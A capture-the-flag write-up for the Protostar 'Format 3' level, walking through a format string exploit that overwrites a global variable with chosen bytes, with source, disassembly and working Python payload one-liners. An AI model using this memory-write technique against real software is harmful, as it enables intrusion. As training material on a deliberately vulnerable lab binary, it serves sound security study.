# PROTOSTAR : FORMAT 3
[Protostar:Format3](https://exploit.education/protostar/format-three/)

### **SOURCE CODE**
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

### **CODE ANALYSIS**
#### Vulnerability
- Format Strings

The level involves Format Strings Vulnerability just like the previous level but unlike the previous level this level involves writing to more than 1 byte of memory, we need to change the value of **target** variable to exactly **0x01025544**.

Below is the disassembly of the **vuln** function.
```
user@protostar:/opt/protostar/bin$ gdb -q format3
Reading symbols from /opt/protostar/bin/format3...done.
(gdb) set disassembly-flavor intel
(gdb) disass vuln
Dump of assembler code for function vuln:
0x08048467 <vuln+0>:    push   ebp
0x08048468 <vuln+1>:    mov    ebp,esp
0x0804846a <vuln+3>:    sub    esp,0x218
0x08048470 <vuln+9>:    mov    eax,ds:0x80496e8
0x08048475 <vuln+14>:   mov    DWORD PTR [esp+0x8],eax
0x08048479 <vuln+18>:   mov    DWORD PTR [esp+0x4],0x200
0x08048481 <vuln+26>:   lea    eax,[ebp-0x208]
0x08048487 <vuln+32>:   mov    DWORD PTR [esp],eax
0x0804848a <vuln+35>:   call   0x804835c <fgets@plt>
0x0804848f <vuln+40>:   lea    eax,[ebp-0x208]
0x08048495 <vuln+46>:   mov    DWORD PTR [esp],eax
0x08048498 <vuln+49>:   call   0x8048454 <printbuffer>
0x0804849d <vuln+54>:   mov    eax,ds:0x80496f4
0x080484a2 <vuln+59>:   cmp    eax,0x1025544
0x080484a7 <vuln+64>:   jne    0x80484b7 <vuln+80>
0x080484a9 <vuln+66>:   mov    DWORD PTR [esp],0x80485a0
0x080484b0 <vuln+73>:   call   0x804838c <puts@plt>
0x080484b5 <vuln+78>:   jmp    0x80484ce <vuln+103>
0x080484b7 <vuln+80>:   mov    edx,DWORD PTR ds:0x80496f4
0x080484bd <vuln+86>:   mov    eax,0x80485c0
0x080484c2 <vuln+91>:   mov    DWORD PTR [esp+0x4],edx
0x080484c6 <vuln+95>:   mov    DWORD PTR [esp],eax
0x080484c9 <vuln+98>:   call   0x804837c <printf@plt>
0x080484ce <vuln+103>:  leave  
0x080484cf <vuln+104>:  ret    
End of assembler dump.
```

Let's find the address of the **target** variable first using objdump.
```
user@protostar:/opt/protostar/bin$ objdump -t format3 | grep "target"
080496f4 g     O .bss   00000004              target
```

Now I am going to use this address as our input string and find the padding of the **printf** function pointer. So we got the **Padding** for the **1st Byte**.
```
user@protostar:/opt/protostar/bin$ (python -c 'print "\xf4\x96\x04\x08" + "%x."*12') | ./format3
�0.bffff5d0.b7fd7ff4.0.0.bffff7d8.804849d.bffff5d0.200.b7fd8420.bffff614.80496f4.
target is 00000000 :(
```

The 2nd, 3rd and 4th Bytes are going to be the adjacent addresses of the 1st byte so they are :-
- **080496f4** (Byte 1)
- **080496f5** (Byte 2)
- **080496f6** (Byte 3)
- **080496f7** (Byte 4)

In the below script, as I discussed previously the **padding** for the 1st byte = 12 and **%n** writes the number of bytes written so far. Only using **%12$n** gives **target = 4** and **0x44 = 68** in decimal so **68 - 4 = 64** so I used **%64x** which gives 64 bytes.
```
user@protostar:/opt/protostar/bin$ (python -c 'print "\xf4\x96\x04\x08" + "%64x%12$n"') | ./format3
�                                                               0
target is 00000044 :(
```

I am going to append all the necessary addresses and change their values. This is going to require some trial and errors. The best way to do this is trying to focus on 1 byte at a time. For example -> the **0x01025544** has **0x44** at the 1st byte(**LITTLE ENDIAN**) so change that first and move on to the 2nd,3rd and 4th byte.

```
user@protostar:/opt/protostar/bin$ (python -c 'print "\xf4\x96\x04\x08" + "\xf5\x96\x04\x08" + "\xf6\x96\x04\x08" + "%56x%12$n" + "%17x%13$n" + "%173x%14$n"') | ./format3
���                                                       0         bffff5d0                                                                                                                                                                     b7fd7ff4
you have modified the target :)
```
There might be problems related to stack alignment so keep changing and figuring it out and try to match each byte with the **target** value.